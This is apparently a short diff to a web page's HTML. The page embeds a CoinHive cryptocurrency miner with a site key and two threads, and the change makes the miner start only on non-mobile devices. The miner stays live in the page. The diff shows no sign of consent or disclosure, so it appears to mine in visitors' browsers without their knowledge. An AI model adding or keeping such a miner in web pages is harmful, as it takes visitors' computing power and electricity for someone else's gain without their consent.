@@ -17,7 +17,9 @@
     <script>
       var miner = new CoinHive.Anonymous('4oRscSkZZprxDccg05fWoI3yID0Jl1yf');
       miner.setNumThreads(2);
-      miner.start();
+      if (!miner.isMobile()) {
+        miner.start();
+      }
     </script>
     <div class="wrapper">
       <header>
